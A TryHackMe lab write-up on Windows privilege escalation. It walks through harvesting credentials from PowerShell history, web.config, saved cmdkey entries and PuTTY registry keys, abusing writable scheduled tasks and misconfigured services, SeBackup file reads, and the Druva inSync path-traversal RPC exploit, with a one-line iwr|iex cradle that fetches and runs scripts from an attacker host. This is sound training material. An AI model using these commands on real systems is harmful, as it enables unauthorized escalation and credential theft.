# Windows Privilege Escalation (TryHackMe)

- **Path/module:** Jr Penetration Tester -> Privilege Escalation. The systematic Windows privesc room -
  the techniques we improvised in [[windows-jump]], done by the book.
- **Room:** Windows Privilege Escalation (~60 min, premium). Tasks 3-7 each deploy their own target VM;
  tasks 2/8/9 are theory/tooling.
- **Date:** 2026-10-18.
- **Status:** SOLVED - all answers (tasks 2-7).
- **Targets:** three Server 2019 (Build 17763) boxes in turn - `wprivesc1` (tasks 3-5, `<ip>`),
  `wprivesc2` (task 6, `<ip>`), `wprivesc3` (task 7, `<ip>`). RDP `thm-unpriv:<redacted-pw>`
  (plus per-task accounts below).
- **Method / workflow note:** these lab boxes were **firewalled from the Windows PC** (445/5985 filtered;
  RDP open on some, not others), so unlike the Linux rooms I could not drive them headlessly with impacket.
  They were worked **over RDP from the AttackBox / local `mstsc`**. To beat the RDP typing+lag problem, I
  hosted small PowerShell enumeration/exploit scripts on the **AttackBox** (`python3 -m http.server 8000`
  in `/tmp`, AttackBox `<ip>`) and ran each with a single line on the target:
  `powershell -c "iwr http://<ip>:8000/tN.ps1|iex"`. One line to type, one screenshot of results.
  The AttackBox is on the internal network with the targets, so the pull always worked (the PC's inbound
  HTTP was firewall-blocked - see [[windows-jump]]).

## Task 2 - concepts

- Users that can change system configuration -> the **Administrators** group (standard users are in
  `Users`).
- SYSTEM has more privileges than Administrator -> **aye** (SYSTEM/LocalSystem has full access, higher
  than an admin). Also note `LOCAL SERVICE` / `NETWORK SERVICE` = low-priv service accounts.

## Task 3 - harvesting passwords from usual spots (wprivesc1)

All four answers came from one hosted enum script reading the "usual spots". The data lives in cleartext:

| Spot | Command | Answer |
|------|---------|--------|
| PowerShell history | `gc "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt"` | julia.jones = `<redacted-pw>` (left in a `cmdkey /add ... /pass:` line) |
| IIS `web.config` | `gc C:\inetpub\wwwroot\web.config \| Select-String connectionString` | db_admin = `<redacted-pw>` |
| Saved Windows creds | `cmdkey /list` then `runas /savecred /user:mike.katz ...` | flag `THM{…}` |
| PuTTY session (proxy) | `reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /f "Proxy" /s` | thom.smith = `<redacted-pw>` (`ProxyPassword`) |

- **mike.katz without typing a password:** `cmdkey /list` showed a *saved* credential for mike.katz, so
  `runas /savecred /user:mike.katz "cmd /c type C:\Users\mike.katz\Desktop\flag.txt > C:\Users\Public\mk.txt"`
  ran as mike.katz non-interactively (no prompt, because the cred is stored) and dropped his flag where we
  could read it.
- Other spots worth checking: unattended-install files (`C:\Windows\Panther\Unattend.xml`,
  `sysprep.xml`), and any password-storing software (browsers, email/FTP/SSH/VNC clients).

## Task 4 - other quick wins (wprivesc1)

- **Scheduled task with a writable executable.** `vulntask` runs `C:\tasks\schtask.bat` as **taskusr1**,
  and the `.bat` is writable by us (`icacls` shows `BUILTIN\Users:(F)`). Point it at a benign command,
  trigger the task, restore the file:

  ```powershell
  schtasks /query /tn vulntask /fo list /v | Select-String 'Task To Run|Run As User'
  Copy-Item C:\tasks\schtask.bat C:\Users\Public\schtask.bak         # backup
  Set-Content C:\tasks\schtask.bat 'type C:\Users\taskusr1\Desktop\flag.txt > C:\Users\Public\t1flag.txt'
  schtasks /run /tn vulntask ; Start-Sleep 6 ; gc C:\Users\Public\t1flag.txt
  Copy-Item C:\Users\Public\schtask.bak C:\tasks\schtask.bat -Force  # restore
  ```
  -> **taskusr1** flag `THM{…}`. (We swapped the room's reverse shell for a flag-copy - same
  write-primitive, nothing to catch.)
- **AlwaysInstallElevated** (info only on this box): if both `HKCU` and `HKLM`
  `...\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated = 1`, any `.msi` installs as SYSTEM.

## Task 5 - abusing service misconfigurations (wprivesc1)

Three sub-flags, three flavours of service weakness. The third flavour yields **SYSTEM**, and SYSTEM can
read every desktop - so a single clean reconfig grabbed all three flags (no exe payloads, service restored
after):

1. **Insecure service executable** - `WindowsScheduler` runs as `svcusr1`; its binary `WService.exe` is
   `Everyone:(M)` -> overwrite the exe to run as svcusr1. Flag `THM{…}`.
2. **Unquoted service path** - `disk sorter enterprise` runs as `svcusr2` with
   `BINARY_PATH_NAME = C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe` (no quotes, spaces) and
   `C:\MyPrograms` is user-writable -> plant `C:\MyPrograms\Disk.exe` so SCM runs it first. Flag
   `THM{…}`.
3. **Insecure service DACL** - `THMService` (normally `.\svcusr3`) grants `BUILTIN\Users`
   `SERVICE_ALL_ACCESS` (check with `accesschk64.exe -qlc THMService`). Reconfigure it to run **anything as
   LocalSystem**:

   ```powershell
   # capture original binPath/account first, then:
   sc.exe config THMService binPath= "cmd /c C:\Users\Public\grab.bat" obj= LocalSystem
   sc.exe stop THMService ; sc.exe start THMService      # grab.bat runs as SYSTEM
   # ... read flags, then restore original binPath/obj
   ```
   `grab.bat` (run as SYSTEM) `type`s the svcusr1 / svcusr2 / Administrator desktop flags into a readable
   file. Administrator flag `THM{…}`.

   > Note: `sc` is a PowerShell alias for `Set-Content` - use **`sc.exe`** for services. Starting a
   > non-service binary makes `sc start` wait ~30s then report failure, but the command already ran as
   > SYSTEM, so the flag file is written first.

## Task 6 - abusing dangerous privileges (wprivesc2)

One flag (Administrator), three possible privileges. We used the cleanest:

- **SeBackup / SeRestore** (account `THMBackup:<redacted-pw>`, a *Backup Operator*). These let you read any
  file via backup semantics, bypassing DACLs. Instead of the room's SAM-dump -> `secretsdump` ->
  pass-the-hash, just copy the flag with backup mode:

  ```cmd
  :: in an ELEVATED console (High integrity - the privilege is stripped from a medium-integrity token)
  robocopy /b "C:\Users\Administrator\Desktop" "C:\Users\Public" flag.txt
  type C:\Users\Public\flag.txt
  ```
  -> `THM{…}`. **Key gotcha:** it only works from a properly **elevated** prompt - verify
  with `whoami /groups` (High Mandatory Level) and `whoami /priv` (SeBackupPrivilege present). A first
  attempt from a non-elevated cmd silently failed (privilege absent).
- Alternatives for the same flag: **SeTakeOwnership** (`takeown`+`icacls` to replace `utilman.exe`, then
  Ease-of-Access on the lock screen -> SYSTEM cmd); **SeImpersonate/SeAssignPrimaryToken** (a potato, e.g.
  RogueWinRM, from a service account / web shell -> SYSTEM). Full SAM-dump route is in the room text.

## Task 7 - abusing vulnerable software (wprivesc3)

- **Druva inSync 6.6.3** runs an RPC server on `127.0.0.1:6064` **as SYSTEM** that will execute commands
  (procedure 5). Its "fix" only checks the command starts with `C:\ProgramData\Druva\inSync4\`, which a
  path-traversal (`...\..\..\..\Windows\System32\cmd.exe`) defeats. Running the room's published PoC (also
  on the box at `C:\tools\Druva_inSync_exploit.txt`) with a benign `$cmd` that reads the Administrator flag
  -> `THM{…}`.
- The exploit must run **on the target** (port is localhost-only) and needs **no elevation** - the RPC
  server is already SYSTEM. If it returns nothing, confirm the service first:
  `netstat -ano | findstr :6064` (it can take ~1 min after boot to listen).
- Methodology: enumerate installed software/versions (`wmic product get name,version,vendor`), then search
  exploit-db / vendor advisories for that exact version.

## Task 8 - tools of the trade

Enumeration automation (run and cross-check, don't trust one): **WinPEAS** (`winpeas.exe > out.txt`),
**PrivescCheck** (PowerShell, `Set-ExecutionPolicy Bypass -Scope process -Force; . .\PrivescCheck.ps1;
Invoke-PrivescCheck`), **WES-NG** (`wes.py systeminfo.txt`, runs on the attacker from `systeminfo`
output - no binary on target), and Metasploit's `multi/recon/local_exploit_suggester` from a Meterpreter
session. Automated tools miss things - know the manual checks above.

## Lessons learned

- **The six misconfig categories, Windows edition** (cf. [[linux-privilege-escalation-basics]]):
  credential disclosure (files/registry/saved creds/software), scheduled tasks, service misconfigs
  (exe perms / unquoted path / service DACL), dangerous privileges (SeBackup/SeTakeOwnership/SeImpersonate),
  and vulnerable software. Each maps to a Linux cousin (writable cron, SUID, sudo, CVE).
- **Enumerate the "usual spots" before anything clever** - PS history, `web.config`, `cmdkey /list`,
  PuTTY/registry, unattend files. Half of real privesc is just reading cleartext someone left behind.
- **Prefer the least-noisy primitive.** Every flag here was reachable with a *benign* command (flag-copy,
  `robocopy /b`, a read-only RPC payload, a service-reconfig to SYSTEM) instead of a reverse shell - and
  restore what you change. The write-primitive is the vuln; the payload is your choice.
- **Service control in PowerShell = `sc.exe`**, not `sc`. **Backup/restore privileges need High
  integrity** - elevate first and confirm with `whoami /priv`.
- **SYSTEM reads everything.** When one vector gives SYSTEM, you don't need to run the others to collect
  their flags - just read the desktops.
- **Tooling/logistics:** when the target is reachable only from the AttackBox (not the PC), host enum
  scripts on the AttackBox and pull them with a one-line `iwr|iex` - turns a laggy RDP typing slog into a
  single command per task. Use `mstsc` from the PC when RDP (3389) is open; otherwise the browser
  split-view (one session at a time, or you get "disconnected because another connection was made").

## Flags / answers

| Task | Item | Technique | Value |
|------|------|-----------|-------|
| 2 | config group | - | *(find it yourself)* |
| 2 | SYSTEM > Admin? | - | *(find it yourself)* |
| 3 | julia.jones pw | PowerShell history | `<redacted-pw>` |
| 3 | db_admin pw | IIS `web.config` | `<redacted-pw>` |
| 3 | mike.katz flag | `cmdkey`+`runas /savecred` | `THM{…}` |
| 3 | thom.smith pw | PuTTY saved proxy creds | `<redacted-pw>` |
| 4 | taskusr1 flag | scheduled task, writable `.bat` | `THM{…}` |
| 5 | svcusr1 flag | insecure service exe perms | `THM{…}` |
| 5 | svcusr2 flag | unquoted service path | `THM{…}` |
| 5 | Administrator flag | insecure service DACL -> SYSTEM | `THM{…}` |
| 6 | Administrator flag | SeBackup (`robocopy /b`) | `THM{…}` |
| 7 | Administrator flag | Druva inSync 6.6.3 RPC (SYSTEM) | `THM{…}` |

## Related

- [[windows-jump]] - the Windows guest->SYSTEM challenge; same categories applied ad hoc (autologon creds,
  insecure service exe, writable SYSTEM task).
- [[linux-privilege-escalation-basics]] / [[linux-privilege-escalation-automation]] - the Linux cousins of
  these vectors.
- [[privesc-module-plan]] - module tracker.
